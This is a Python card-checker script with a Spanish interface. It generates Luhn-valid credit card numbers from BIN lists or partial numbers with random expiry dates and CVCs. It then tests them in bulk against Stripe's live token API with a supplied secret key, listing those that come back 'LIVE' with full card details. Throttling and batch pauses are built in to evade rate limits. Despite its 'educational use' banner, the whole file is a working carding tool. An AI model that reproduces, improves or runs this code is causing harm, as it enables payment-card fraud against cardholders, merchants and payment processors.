#!/usr/bin/env python3
import requests
import json
import random
import time
import os
import sqlite3
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

class SecureCCChecker:
    def __init__(self):
        self.sk = ""
        self.sk_type = ""
        self.sk_status = ""
        self.generated_cards = []
        self.valid_cards = []
        self.bins = []
        self.session_validations = 0
        self.load_bins()
        
    def load_bins(self):
        self.bins = [
            "411111", "424242", "453201", "491748", "455673", "402400", "448562",
            "555555", "510510", "520082", "542523", "550692", "530125",
            "400005", "511151", "522222", "533333", "544444",
            "453202", "450903", "462294", "403000", "410039",
            "516320", "516345", "527458", "535231", "543111",
            "453957", "471604", "402944", "448430", "455676",
            "516292", "516293", "516294", "542418", "542419"
        ]
    
    def validate_stripe_key(self, sk):
        try:
            headers = {
                'Authorization': f'Bearer {sk}',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            response = requests.get(
                'https://api.stripe.com/v1/balance',
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                return 'live', "✅ SK ACTIVO"
            elif response.status_code == 401:
                return 'dead', "❌ SK INVALIDO"
            else:
                return 'unknown', f"⚠️ SK CON PROBLEMAS"
                
        except:
            return 'unknown', "🌐 ERROR DE CONEXIÓN"
    
    def set_stripe_key(self):
        print(f"\n{Fore.CYAN}=== CONFIGURAR STRIPE SECRET KEY ===")
        sk = input("Ingresa tu Stripe Secret Key: ").strip()
        
        if not sk.startswith(('sk_test_', 'sk_live_')):
            print(f"{Fore.RED}✗ Formato de SK inválido")
            return False
        
        print(f"{Fore.YELLOW}🔍 Validando SK...")
        sk_status, message = self.validate_stripe_key(sk)
        
        if sk_status == 'live':
            status_color = Fore.GREEN
        elif sk_status == 'dead':
            status_color = Fore.RED  
        else:
            status_color = Fore.YELLOW
        
        print(f"{status_color}{message}")
        
        if sk.startswith('sk_test_'):
            self.sk = sk
            self.sk_type = 'test'
            self.sk_status = sk_status
            self.session_validations = 0
            print(f"{Fore.GREEN}✓ SK de TEST configurado")
            return True
            
        elif sk.startswith('sk_live_'):
            print(f"\n{Fore.RED}🚨 MODO LIVE - PRECAUCIÓN")
            confirm = input(f"{Fore.RED}¿Continuar? (s/n): ").lower()
            if confirm != 's':
                return False
            self.sk = sk
            self.sk_type = 'live'
            self.sk_status = sk_status
            self.session_validations = 0
            print(f"{Fore.GREEN}✓ SK de LIVE configurado")
            return True
        
        return False
    
    def get_limits(self):
        if self.sk_type == 'test':
            return {
                'max_generate': 1000,
                'max_validate_per_session': 2000,
                'delay_between_requests': 0.3,
                'batch_delay': 2
            }
        else:
            return {
                'max_generate': 100,
                'max_validate_per_session': 500,
                'delay_between_requests': 1.0,
                'batch_delay': 5
            }
    
    def generate_from_partial(self, partial_number):
        number = ""
        for char in partial_number:
            if char.upper() == 'X':
                number += str(random.randint(0, 9))
            else:
                number += char
        
        while len(number) < 15:
            number += str(random.randint(0, 9))
        
        return self.luhn_complete(number)
    
    def generate_cc(self, input_data=None, month=None, year=None):
        if not input_data:
            bin_num = random.choice(self.bins)
            card_number = self.generate_card_number(bin_num)
        else:
            if len(input_data) == 6 and input_data.isdigit():
                card_number = self.generate_card_number(input_data)
            elif 'X' in input_data.upper():
                card_number = self.generate_from_partial(input_data)
            elif len(input_data.replace(" ", "")) == 16:
                card_number = input_data.replace(" ", "")
            else:
                print(f"{Fore.RED}✗ Formato inválido")
                return None
        
        card_type = "VISA" if card_number.startswith('4') else "MASTERCARD"
        
        return {
            'number': card_number,
            'exp_month': month or str(random.randint(1, 12)).zfill(2),
            'exp_year': year or str(random.randint(2024, 2028)),
            'cvc': str(random.randint(100, 999)),
            'card_type': card_type,
            'stripe_valid': None,
            'live': False,
            'source': 'generated'
        }
    
    def add_manual_card(self):
        print(f"\n{Fore.CYAN}=== AGREGAR TARJETA MANUAL ===")
        try:
            number = input("Número (16 dígitos): ").replace(" ", "")
            if len(number) != 16 or not number.isdigit():
                print(f"{Fore.RED}✗ Número inválido")
                return None
            
            exp_month = input("Mes (MM): ")
            exp_year = input("Año (YYYY): ")
            cvc = input("CVV: ")
            
            card_type = "VISA" if number.startswith('4') else "MASTERCARD"
            
            return {
                'number': number,
                'exp_month': exp_month,
                'exp_year': exp_year,
                'cvc': cvc,
                'card_type': card_type,
                'stripe_valid': None,
                'live': False,
                'source': 'manual'
            }
        except:
            print(f"{Fore.RED}✗ Error en los datos")
            return None
    
    def generate_card_number(self, bin_num):
        number = bin_num
        for _ in range(15 - len(bin_num)):
            number += str(random.randint(0, 9))
        return self.luhn_complete(number)
    
    def luhn_complete(self, number):
        def luhn_checksum(card_number):
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d * 2))
            return checksum % 10
        
        for i in range(10):
            test_number = number + str(i)
            if luhn_checksum(test_number) == 0:
                return test_number
        return number + '0'
    
    def safe_validate_cc(self, cc_data):
        if not self.sk:
            return False, False, "No SK"
        
        if self.sk_status == 'dead':
            return False, False, "SK INVALIDO"
        
        try:
            headers = {
                'Authorization': f'Bearer {self.sk}',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            data = {
                'card[number]': cc_data['number'],
                'card[exp_month]': cc_data['exp_month'],
                'card[exp_year]': cc_data['exp_year'],
                'card[cvc]': cc_data['cvc']
            }
            
            response = requests.post(
                'https://api.stripe.com/v1/tokens',
                headers=headers,
                data=data,
                timeout=10
            )
            
            self.session_validations += 1
            is_valid = False
            is_live = False
            
            if response.status_code == 200:
                is_valid = True
                if self.sk_type == 'live':
                    is_live = True
                    return is_valid, is_live, "LIVE"
                else:
                    if not any(test_bin in cc_data['number'] for test_bin in ['424242', '555555']):
                        is_live = True
                        return is_valid, is_live, "LIVE"
                    return is_valid, is_live, "VÁLIDA"
            else:
                return False, False, "INVÁLIDA"
                
        except Exception as e:
            return False, False, f"Error"
    
    def generate_multiple_cc(self):
        limits = self.get_limits()
        
        print(f"\n{Fore.CYAN}=== GENERAR TARJETAS ===")
        print(f"{Fore.YELLOW}1. Con BIN (6 dígitos)")
        print(f"{Fore.YELLOW}2. Con número parcial (usar X)")
        print(f"{Fore.YELLOW}3. Agregar tarjeta manual")
        
        try:
            option = input("Opción (1/2/3): ")
            
            if option == '1':
                max_limit = limits['max_generate']
                count = int(input(f"¿Cuántas? (1-{max_limit}): "))
                
                if count < 1 or count > max_limit:
                    print(f"{Fore.RED}✗ Número inválido")
                    return
                
                print(f"\n{Fore.CYAN}BINs: {', '.join(self.bins[:8])}...")
                bin_input = input("BIN (vacío=aleatorio): ") or None
                month = input("Mes (vacío=aleatorio): ") or None
                year = input("Año (vacío=aleatorio): ") or None
                
                print(f"{Fore.YELLOW}Generando {count} tarjetas...")
                new_cards = []
                
                for i in range(count):
                    card = self.generate_cc(bin_input, month, year)
                    if card:
                        new_cards.append(card)
                        if i < 5 or (i + 1) % 50 == 0:
                            print(f"{Fore.WHITE}[{i+1}/{count}] {card['number']}")
                
                self.generated_cards.extend(new_cards)
                print(f"{Fore.GREEN}✓ {count} tarjetas generadas")
                
            elif option == '2':
                print(f"\n{Fore.CYAN}=== NÚMERO PARCIAL ===")
                print(f"{Fore.YELLOW}Ej: 411111XXXXXX1234")
                
                partial = input("Número con X: ").replace(" ", "")
                
                if not any(char.upper() == 'X' for char in partial):
                    print(f"{Fore.RED}✗ Usa X para dígitos faltantes")
                    return
                
                max_limit = min(500, limits['max_generate'])
                count = int(input(f"Variaciones (1-{max_limit}): "))
                if count < 1 or count > max_limit:
                    print(f"{Fore.RED}✗ Número inválido")
                    return
                
                month = input("Mes (vacío=aleatorio): ") or None
                year = input("Año (vacío=aleatorio): ") or None
                
                print(f"{Fore.YELLOW}Generando {count} variaciones...")
                new_cards = []
                
                for i in range(count):
                    card = self.generate_cc(partial, month, year)
                    if card:
                        new_cards.append(card)
                        if i < 5 or (i + 1) % 50 == 0:
                            print(f"{Fore.WHITE}[{i+1}/{count}] {card['number']}")
                
                self.generated_cards.extend(new_cards)
                print(f"{Fore.GREEN}✓ {count} variaciones")
                
            elif option == '3':
                card = self.add_manual_card()
                if card:
                    self.generated_cards.append(card)
                    print(f"{Fore.GREEN}✓ Tarjeta agregada")
            
        except ValueError:
            print(f"{Fore.RED}✗ Número inválido")
        except Exception as e:
            print(f"{Fore.RED}✗ Error")
    
    def validate_with_protection(self):
        if not self.sk:
            print(f"{Fore.RED}✗ Configura SK primero")
            return
        
        if self.sk_status == 'dead':
            print(f"{Fore.RED}✗ SK INVALIDO")
            return
        
        if not self.generated_cards:
            print(f"{Fore.RED}✗ No hay tarjetas")
            return
        
        limits = self.get_limits()
        remaining = limits['max_validate_per_session'] - self.session_validations
        max_to_validate = min(len(self.generated_cards), remaining)
        
        if max_to_validate <= 0:
            print(f"{Fore.RED}✗ Límite alcanzado")
            return
        
        cards_to_validate = self.generated_cards[:max_to_validate]
        
        print(f"\n{Fore.CYAN}=== VALIDANDO {len(cards_to_validate)} TARJETAS ===")
        print(f"{Fore.YELLOW}Restantes: {remaining}")
        
        valid_count = 0
        live_count = 0
        
        for i, card in enumerate(cards_to_validate, 1):
            # LÍNEA CORREGIDA - sin error de paréntesis
            if i <= 5 or i % 10 == 0:
                print(f"{Fore.WHITE}[{i}/{len(cards_to_validate)}] {card['number']}... ", end="")
            else:
                print(f"{Fore.WHITE}[{i}/{len(cards_to_validate)}]... ", end="")
            
            is_valid, is_live, message = self.safe_validate_cc(card)
            card['stripe_valid'] = is_valid
            card['live'] = is_live
            
            if i <= 5 or i % 10 == 0:
                if is_live:
                    print(f"{Fore.GREEN}LIVE ✓")
                elif is_valid:
                    print(f"{Fore.CYAN}VÁLIDA ✓")
                else:
                    print(f"{Fore.RED}INVÁLIDA ✗")
            else:
                if is_live:
                    print(f"{Fore.GREEN}LIVE ✓")
                elif is_valid:
                    print(f"{Fore.CYAN}✓")
                else:
                    print(f"{Fore.RED}✗")
            
            if is_live:
                live_count += 1
                valid_count += 1
            elif is_valid:
                valid_count += 1
            
            time.sleep(limits['delay_between_requests'])
            
            if i % 50 == 0 and i < len(cards_to_validate):
                print(f"{Fore.YELLOW}⏸️  Pausa...")
                time.sleep(limits['batch_delay'])
        
        self.valid_cards.extend([card for card in cards_to_validate if card.get('stripe_valid')])
        
        print(f"\n{Fore.GREEN}=== COMPLETADO ===")
        print(f"{Fore.WHITE}Total: {len(cards_to_validate)}")
        print(f"{Fore.CYAN}Válidas: {valid_count}")
        print(f"{Fore.GREEN}LIVE: {live_count}")
        print(f"{Fore.RED}Inválidas: {len(cards_to_validate)-valid_count}")
        print(f"{Fore.YELLOW}Éxito: {(valid_count/len(cards_to_validate))*100:.1f}%")
    
    def show_menu(self):
        if self.sk_status == 'live':
            sk_color = Fore.GREEN
            sk_status_text = "LIVE ✅"
        elif self.sk_status == 'dead':
            sk_color = Fore.RED
            sk_status_text = "DEAD ❌"
        else:
            sk_color = Fore.YELLOW
            sk_status_text = "UNKNOWN ⚠️"
        
        sk_type_text = f"{Fore.GREEN}LIVE" if self.sk_type == 'live' else f"{Fore.CYAN}TEST"
        limits = self.get_limits()
        remaining = limits['max_validate_per_session'] - self.session_validations
        
        print(f"\n{Fore.MAGENTA}=== CHECKER CC - MODO {sk_type_text} ===")
        print(f"{Fore.CYAN}SK: {'✓' if self.sk else '✗'} | Estado: {sk_color}{sk_status_text}")
        print(f"{Fore.CYAN}Tarjetas: {len(self.generated_cards)} | Validadas: {self.session_validations}")
        print(f"{Fore.YELLOW}Restantes: {remaining}/{limits['max_validate_per_session']}")
        
        print(f"{Fore.YELLOW}1. Configurar Stripe SK")
        print(f"{Fore.YELLOW}2. Generar/Agregar tarjetas")
        print(f"{Fore.YELLOW}3. Validar tarjetas")
        print(f"{Fore.YELLOW}4. Mostrar tarjetas")
        print(f"{Fore.YELLOW}5. Mostrar LIVE")
        print(f"{Fore.YELLOW}6. Limpiar todo")
        print(f"{Fore.YELLOW}7. Estadísticas")
        print(f"{Fore.YELLOW}8. Reiniciar sesión")
        print(f"{Fore.YELLOW}0. Salir")
        
        return input(f"\n{Fore.GREEN}Opción: ")
    
    def reset_session(self):
        confirm = input(f"{Fore.YELLOW}¿Reiniciar? (s/n): ").lower()
        if confirm == 's':
            self.session_validations = 0
            print(f"{Fore.GREEN}✓ Sesión reiniciada")
    
    def show_statistics(self):
        print(f"\n{Fore.CYAN}=== ESTADÍSTICAS ===")
        print(f"{Fore.WHITE}Tarjetas: {len(self.generated_cards)}")
        print(f"{Fore.CYAN}Válidas: {len(self.valid_cards)}")
        
        live_cards = [card for card in self.generated_cards if card.get('live')]
        print(f"{Fore.GREEN}LIVE: {len(live_cards)}")
        
        limits = self.get_limits()
        print(f"{Fore.YELLOW}Sesión: {self.session_validations}/{limits['max_validate_per_session']}")
    
    def show_live_cards(self):
        live_cards = [card for card in self.generated_cards if card.get('live')]
        
        if not live_cards:
            print(f"{Fore.RED}✗ No hay LIVE")
            return
        
        print(f"\n{Fore.GREEN}=== LIVE ({len(live_cards)}) ===")
        for i, card in enumerate(live_cards, 1):
            print(f"{i}. {Fore.GREEN}{card['number']} | {card['exp_month']}/{card['exp_year']} | {card['cvc']}")
    
    def clear_cards(self):
        confirm = input(f"{Fore.RED}¿Eliminar TODO? (s/n): ").lower()
        if confirm == 's':
            self.generated_cards = []
            self.valid_cards = []
            print(f"{Fore.GREEN}✓ Todo eliminado")
    
    def run(self):
        print(f"{Fore.CYAN}=== CHECKER CC - USO EDUCATIVO ===")
        print(f"{Fore.YELLOW}✅ Hasta 1000 tarjetas")
        print(f"{Fore.YELLOW}✅ Validación segura")
        
        while True:
            choice = self.show_menu()
            
            if choice == '1':
                self.set_stripe_key()
            elif choice == '2':
                self.generate_multiple_cc()
            elif choice == '3':
                self.validate_with_protection()
            elif choice == '4':
                if not self.generated_cards:
                    print(f"{Fore.RED}✗ No hay tarjetas")
                else:
                    print(f"\n{Fore.CYAN}=== TARJETAS ({len(self.generated_cards)}) ===")
                    for i, card in enumerate(self.generated_cards, 1):
                        color = Fore.GREEN if card.get('live') else Fore.CYAN if card.get('stripe_valid') else Fore.RED if card.get('stripe_valid') is False else Fore.YELLOW
                        status = "LIVE" if card.get('live') else "VÁLIDA" if card.get('stripe_valid') else "INVÁLIDA" if card.get('stripe_valid') is False else "NO VALIDADA"
                        print(f"{i}. {color}{card['number']} | {status}")
            elif choice == '5':
                self.show_live_cards()
            elif choice == '6':
                self.clear_cards()
            elif choice == '7':
                self.show_statistics()
            elif choice == '8':
                self.reset_session()
            elif choice == '0':
                print(f"{Fore.GREEN}¡Hasta luego!")
                break
            else:
                print(f"{Fore.RED}Opción inválida")
            
            input(f"\n{Fore.YELLOW}Enter...")

if __name__ == "__main__":
    checker = SecureCCChecker()
    checker.run()